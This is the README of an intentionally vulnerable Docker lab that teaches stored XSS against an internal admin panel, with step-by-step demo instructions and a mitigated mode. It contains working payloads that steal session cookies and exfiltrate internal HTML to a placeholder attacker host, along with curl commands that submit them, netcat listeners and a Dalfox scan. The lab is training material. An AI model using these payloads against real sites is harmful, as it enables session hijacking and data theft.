# Dalfox XSS Lab

Stored XSS / second-order XSS laboratory for isolated demonstrations with Docker Compose, Nginx, Node.js, PostgreSQL, Playwright, and a manual Python collector.

This repository starts in intentionally vulnerable mode. Use it only in a controlled environment that you own.

## What This Lab Demonstrates

1. A public form on `cross.fit` stores attacker-controlled content.
2. An internal admin panel on `backend.cross.fit` later renders that content.
3. A privileged browser session can become the bridge to an internal system even when the attacker cannot reach that backend directly.
4. Mitigations such as contextual output escaping, `HttpOnly`, and CSP reduce or block exploitation.

## Architecture

Services:

- `public-proxy`: only published entrypoint on host port `80`
- `public-app`: public gym landing page and contact form
- `internal-proxy`: Docker-only reverse proxy for `backend.cross.fit`
- `internal-app`: internal admin panel
- `worker`: Playwright browser logged in as admin
- `db`: PostgreSQL 16

Trust boundary:

- `cross.fit` is reachable from the attacker machine.
- `backend.cross.fit` is only resolvable inside Docker through the `internal-proxy` alias.
- The attacker should not be able to browse `backend.cross.fit` directly through the exposed port.

## Repository Layout

```text
.
├── docker-compose.yml
├── db/
├── nginx/
├── public-app/
├── internal-app/
├── worker/
├── tools/
└── docs/project_notes/
```

## Requirements

- Docker Engine + Docker Compose plugin
- `curl`
- Python 3
- Optional: Dalfox on the attacker machine

## Local Domains

Variables used in this guide:

- `container_machine_ip`: IP of the machine that is running the lab containers
- `attacker_machine_ip`: IP of the attacker machine
- `docker_host_gateway_ip`: optional host gateway visible from containers when attacker and lab run on the same host

### Attacker machine

Add only this mapping:

```text
container_machine_ip   cross.fit
```

Do not add:

```text
container_machine_ip   backend.cross.fit
```

Reason:

- the attacker should resolve `cross.fit`
- the attacker should not resolve `backend.cross.fit` directly

### Same-host note

If you are validating the lab from a single machine instead of two separate machines, some XSS callbacks may need to target the Docker host gateway instead of a second host. In that case, use a value such as `docker_host_gateway_ip` in the payloads.

## Configuration

Copy `.env.example` to `.env` if you want persistent local overrides:

```bash
cp .env.example .env
```

Supported variables:

- `LAB_MODE=vulnerable|mitigated`
- `COOKIE_HTTPONLY=` optional explicit override
- `ENABLE_CSP=` optional explicit override
- `RENDER_UNSAFE_HTML=` optional explicit override
- `POLL_INTERVAL_SECONDS=20`

Behavior:

- `vulnerable`:
  - raw HTML rendering enabled
  - `HttpOnly=false`
  - CSP disabled
- `mitigated`:
  - escaped output enabled
  - `HttpOnly=true`
  - CSP enabled

## Start The Lab

```bash
docker compose up --build -d
```

Check status:

```bash
docker compose ps
```

Expected:

- `public-proxy` published on `0.0.0.0:80`
- `public-app`, `internal-app`, `internal-proxy`, `db`, and `worker` running
- no published host ports for `3000`, `3001`, or `5432`

## Reset The Lab Database

After a full lab run, you can restore the database to a clean baseline with:

```bash
./tools/reset-db.sh
```

This reset does the following:

- removes all rows from `contact_messages`
- removes all rows from `internal_users`
- recreates the internal user `admin/admin123`
- inserts a small set of benign example contact messages

SQL source:

```text
db/reset_lab.sql
```

Expected result after reset:

- the worker can log in again as `admin`
- there are no old XSS payloads left in the database
- the message list starts from a known baseline

## Infrastructure Validation

### Public entrypoint

```bash
curl -i http://cross.fit/
```

Expected: landing page for `CrossFit Atlas`.

### Backend isolation

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Expected: connection closed, empty reply, or a non-success response. The internal backend must not be reachable through the published port.

### Worker access to internal backend

```bash
docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
```

Expected: `200 OK`.

## Public App Flow

Open:

```text
http://cross.fit
```

Submit the contact form with:

- `full_name`
- `email`
- optional `phone`
- `message`

The `message` field is intentionally stored without sanitization in vulnerable mode.

## Optional Collector Script

Later in the lab, when you no longer want to capture requests by hand, you can use the bundled collector:

```bash
python3 tools/collector.py
```

It listens on:

```text
0.0.0.0:9000
```

## Step-by-Step Presentation Flow

This section describes the presentation flow in the same order you can use live during the demo.

### Step 1: show the public application

Open:

```text
http://cross.fit
```

Explain that:

- the user-facing entrypoint is the public site
- the contact form stores the submitted message
- the page source contains a small operational hint that messages are reviewed from `backend.cross.fit`

### Step 2: confirm backend isolation

From the attacker machine, try:

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Expected:

- the attacker does not get the internal panel
- the connection closes or returns a non-success response

This establishes that direct access to `backend.cross.fit` is not available from the attacker side.

### Step 3: start a simple HTTP listener on the attacker side

Run this on the attacker machine:

```bash
python3 -m http.server 8000
```

Expected:

- the terminal prints a log line for every HTTP request received
- no extra code is needed on the attacker side

### Step 4: submit a probe payload through the public form

Use a payload that only makes a request to the attacker-controlled HTTP server:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

If attacker and lab are on the same host, use:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

Submit it through the public form on `cross.fit`, or with `curl`.

### Step 5: wait for the worker

The worker logs in as admin to `backend.cross.fit`, opens the next message, renders it, and marks it as processed.

You can watch it with:

```bash
docker compose logs -f worker
```

### Step 6: show the incoming request on the attacker server

Expected on the attacker machine:

```text
"GET /ping HTTP/1.1" 404 -
```

The `404` is acceptable. The relevant fact is that the request reached the attacker-controlled server.

### Step 7: explain the conclusion

At this point you can state:

- the attacker never browsed `backend.cross.fit` directly
- the public form stored attacker-controlled input
- the privileged browser session attached to `backend.cross.fit` executed the payload
- this is enough to confirm that the internal panel is vulnerable to stored XSS

### Step 8: prepare a manual listener for raw HTTP requests

For the next step you want to receive a `POST` body manually, without using the bundled collector yet.

On the attacker machine, start a raw listener on port `9000`:

```bash
nc -lvnp 9000 | tee raw-http-request.txt
```

If your environment provides `ncat` instead of `nc`, use:

```bash
ncat -lvnp 9000 | tee raw-http-request.txt
```

Expected:

- the terminal stays waiting for a connection
- when the XSS fires, you will see the full HTTP request
- the request body will contain the Base64-encoded HTML

### Step 9: exfiltrate the unauthenticated front page of `backend.cross.fit`

Now submit a payload that fetches the backend front page without sending the admin session cookie, encodes the returned HTML in Base64, and sends it to the attacker listener.

Payload:

```html
<script>
fetch('/', { credentials: 'omit' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

If attacker and lab are on the same host, use:

```html
<script>
fetch('/', { credentials: 'omit' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://docker_host_gateway_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Why `credentials: 'omit'` matters:

- the XSS is executing in an authenticated admin session
- if the payload reused that session, the backend front page could redirect to the dashboard
- omitting credentials forces the fetch to retrieve the unauthenticated front page instead

### Step 10: wait for the worker and inspect the raw HTTP request

As before, the worker will render the stored message from `/admin/messages/next`.

Expected in the attacker terminal:

- `POST /internal-html`
- HTTP headers
- a blank line
- the raw Base64 body at the end of the request

### Step 11: decode the Base64 manually and save it as HTML

Copy only the request body, that is, the Base64 content after the blank line, and decode it:

```bash
printf '%s' 'BASE64_AQUI' | base64 -d > backend-frontpage.html
```

Then open the saved file:

```bash
xdg-open backend-frontpage.html
```

Or inspect it directly:

```bash
rg -n "<title>|<form|username|password" backend-frontpage.html
```

### Step 12: validate the expected result

The decoded HTML should correspond to the login page of `backend.cross.fit`.

You should find indicators such as:

- title similar to `Acceso interno`
- a login form
- `username`
- `password`

This demonstrates that the attacker can use the XSS not only to trigger a request, but also to read internal HTML and move that content outside the segmented backend.

### Step 13: move to the scripted collector later

Once this manual capture is understood and demonstrated, you can switch to:

```bash
python3 tools/collector.py
```

At that point the collector automates the parts you already proved by hand:

- receiving `GET` and `POST`
- showing the raw body
- decoding Base64 automatically
- making later payloads easier to inspect

## Payloads

Replace:

- `attacker_machine_ip` with the IP of the attacker machine
- `docker_host_gateway_ip` only when doing same-host validation

### Probe request to a manual Python HTTP server

Use this first if you only want to prove code execution against the internal backend:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

Same-host validation shortcut:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

Expected on the attacker machine with `python3 -m http.server 8000`:

```text
"GET /ping HTTP/1.1" 404 -
```

The `404` is fine. What matters is that the request reached the attacker-controlled server.

### Backend front page exfiltration in Base64

Use this after the probe request, when you want to retrieve the unauthenticated front page of `backend.cross.fit` and decode it locally:

```html
<script>
fetch('/', { credentials: 'omit' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Same-host validation shortcut:

```html
<script>
fetch('/', { credentials: 'omit' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://docker_host_gateway_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Expected:

- the attacker-side listener receives `POST /internal-html`
- the raw body is Base64
- decoding it yields the login page HTML of `backend.cross.fit`

### Visual XSS

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

Expected:

- the script executes in the privileged Playwright browser
- the worker logs the dialog event

### Cookie theft

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Expected in vulnerable mode:

- `collector.py` receives `GET /collect`
- the query contains `gym_internal_session=...`

### Internal HTML exfiltration

```html
<script>
fetch('/admin/messages', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Expected in vulnerable mode:

- `collector.py` receives `POST /internal-html`
- the body decodes to the HTML of `/admin/messages`

## Submit Payloads With curl

### Legitimate message

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Juan Perez" \
  -d "email=juan@example.com" \
  -d "phone=099123456" \
  -d "message=Quiero informacion sobre planes mensuales"
```

### Cookie payload

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS" \
  -d "email=xss@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)\">"
```

### Probe request to Python HTTP server

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Probe" \
  -d "email=xss-probe@example.com" \
  -d "phone=099000009" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
```

### Backend front page exfiltration in Base64

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Frontpage" \
  -d "email=xss-frontpage@example.com" \
  -d "phone=099000011" \
  --data-urlencode "message=<script>fetch('/', { credentials: 'omit' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
```

### HTML exfiltration payload

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS 2" \
  -d "email=xss2@example.com" \
  -d "phone=099000001" \
  --data-urlencode "message=<script>fetch('/admin/messages', { credentials: 'include' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
```

## Worker Behavior

The worker intentionally behaves like a real privileged user:

1. Opens `http://backend.cross.fit/login`
2. Logs in as `admin`
3. Visits `/admin/messages/next`
4. Waits for the page to render
5. Marks the message as processed

Logs:

```bash
docker compose logs -f worker
```

## Dalfox

Primary scenario:

```bash
dalfox url "http://cross.fit/contact" \
  -X POST \
  -d "full_name=Test&email=test@example.com&phone=123&message=INJECT_HERE"
```

Notes:

- this repository does not include the optional `/preview` helper route
- the core exercise focuses on the stored XSS chain, not a reflected helper

## Mitigation Mode

Switch the lab to mitigated mode:

```bash
LAB_MODE=mitigated docker compose up -d --build internal-app worker
```

Mitigated behavior:

- message detail renders escaped content instead of raw HTML
- session cookie is `HttpOnly`
- CSP blocks inline scripts and inline event handlers

## Validate The Mitigation

1. Start a fresh `collector.py`.
2. Switch to mitigated mode.
3. Submit the same payloads again.
4. Watch the worker logs.
5. Confirm the collector receives nothing.

Expected:

- the worker still processes the message
- the payload appears as text in the internal detail view
- no cookie theft reaches the collector
- no `/internal-html` POST reaches the collector

## Shutdown

```bash
docker compose down -v
```

## Notes About Intentional Insecurity

This repository intentionally includes:

- stored attacker-controlled HTML in the public form flow
- a vulnerable raw HTML sink in the admin detail page when `LAB_MODE=vulnerable`
- static lab credentials (`admin/admin123`)
- non-`HttpOnly` session cookies in vulnerable mode

These choices exist only for the lab scenario.

## References

- OWASP Cross-Site Scripting:
  `https://owasp.org/www-community/attacks/xss/`
- OWASP XSS Prevention Cheat Sheet:
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- MDN Cookies / HttpOnly:
  `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies`
- Docker Compose Networking:
  `https://docs.docker.com/compose/how-tos/networking/`
- Nginx access controls:
  `https://nginx.org/en/docs/http/ngx_http_access_module.html`
